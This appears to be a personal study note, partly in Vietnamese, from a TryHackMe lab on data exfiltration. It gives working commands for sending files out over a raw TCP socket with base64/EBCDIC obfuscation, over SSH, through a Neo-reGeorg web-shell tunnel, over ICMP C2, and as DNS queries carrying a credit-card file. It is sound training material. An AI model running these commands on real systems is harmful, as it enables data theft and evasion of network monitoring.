## [[Exfiltration]] | [[Data Exfiltration from MITRE]]

### TCP SOCKET

#### Attack Box:
```Terminal
thm@jump-box:~$ nc -lvnp 8080 > /tmp/task4-creds.data
Listening on 0.0.0.0 8080
```

#### Victim:
![[Screenshot 2025-08-25 at 12.24.28.png]]
`tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080`
![[Screenshot 2025-08-25 at 12.25.24.png]]
##### Break down code :
1. **Tạo tệp lưu trữ bằng lệnh `tar`**:
   - Sử dụng lệnh `tar` với các tham số `zcf` để tạo tệp lưu trữ từ thư mục `secret`.
   - Ý nghĩa các tham số:
     - `z`: Sử dụng gzip để nén thư mục.
     - `c`: Tạo một tệp lưu trữ mới.
     - `f`: Chỉ định sử dụng tệp lưu trữ.

2. **Mã hóa Base64**:
   - Tệp lưu trữ được tạo bởi `tar` được chuyển qua lệnh `base64` để chuyển đổi thành định dạng Base64.
   - Mục đích: Mã hóa dữ liệu để che giấu nội dung gốc.

3. **Sao chép và mã hóa bằng lệnh `dd`**:
   - Kết quả từ lệnh `base64` được chuyển tiếp để tạo và sao chép tệp dự phòng bằng lệnh `dd`, sử dụng mã hóa EBCDIC.
   - EBCDIC: Một định dạng mã hóa bổ sung để tăng cường bảo vệ dữ liệu.

4. **Chuyển dữ liệu qua TCP**:
   - Kết quả cuối cùng từ lệnh `dd` được chuyển hướng để gửi qua socket TCP đến địa chỉ IP và cổng được chỉ định (cổng 8080).

**Lý do sử dụng mã hóa Base64 và EBCDIC**:
   - Bảo vệ dữ liệu trong quá trình trích xuất.
   - Nếu lưu lượng mạng bị kiểm tra, dữ liệu ở định dạng không thể đọc được bằng mắt thường, che giấu loại tệp được truyền.

#### Attack box:
```Terminal
thm@jump-box:~$ nc -lvnp 8080 > /tmp/task4-creds.data
Listening on 0.0.0.0 8080
Connection received on 192.168.0.101 55658
thm@jump-box:~$ ls -l /tmp/task4-creds.data 
-rw-r--r-- 1 thm root 244 Aug 25 08:19 /tmp/task4-creds.data
thm@jump-box:~$ cd /tmp/
thm@jump-box:/tmp$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
244 bytes copied, 4.0488e-05 s, 6.0 MB/s
```
![[Screenshot 2025-08-25 at 12.27.57.png]]
Recieved file from Victim

___
### Exfiltrate using SSH
##### Victim
![[Screenshot 2025-08-25 at 12.39.18.png]]
```Terminal
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

##### Attacker
![[Screenshot 2025-08-25 at 12.40.31.png]]

___
### Exfiltrate using HTTP(S)


#### HTTP Tunneling
```Terminal
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
```
![[Screenshot 2025-08-25 at 13.05.17.png]]
following url: http://10.201.0.83/uploader and upload the tunnel.php file

```Terminal
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.201.0.83/uploader/files/tunnel.php
```

```Terminal
root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80

Welcome to APP Server!
```
![[Screenshot 2025-08-25 at 13.06.39.png]]
Get flag
![[Screenshot 2025-08-25 at 13.07.22.png]]
___
### Exfiltration using ICMP
##### C2 communication
**ICMP HOST** `sudo icmpdoor -i eth0 -d 192.168.0.133`
![[Screenshot 2025-08-25 at 14.50.57.png]]

**JUMP BOX** `sudo icmp-cnc -i eth1 -d 192.168.0.121`
![[Screenshot 2025-08-25 at 14.52.35.png]]
___
### DNS Configuration
![[Screenshot 2025-08-25 at 14.56.11.png]]
![[Screenshot 2025-08-25 at 15.00.31.png]]
![[Screenshot 2025-08-25 at 15.00.03.png]]
___
### Exfiltration over DNS
![[Pasted image 20250825150355.png]]

#### DNS Data Exfiltration
**Encode the Content of the credit.txt File**
`cat task9/credit.txt | base64`
**Splitting the content into multipleDNSrequests**
`cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'`
**Splitting the content into a singleDNSrequest**
`cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash`
![[Screenshot 2025-08-25 at 15.13.24.png]]
**Cleaning and Restoring the Receiving Data**
`echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d`
![[Screenshot 2025-08-25 at 15.13.01.png]]

#### C2 Communications over DNS
Create script
```bash
#!/bin/bash 
ping -c 1 test.thm.com
```
![[Screenshot 2025-08-25 at 15.22.25.png]]

![[Screenshot 2025-08-25 at 15.22.05.png]]![[Screenshot 2025-08-25 at 15.24.03.png]]![[Screenshot 2025-08-25 at 15.27.06.png]]
___
### DNS Tunneling
**Server side**
![[Screenshot 2025-08-25 at 15.31.02.png]]
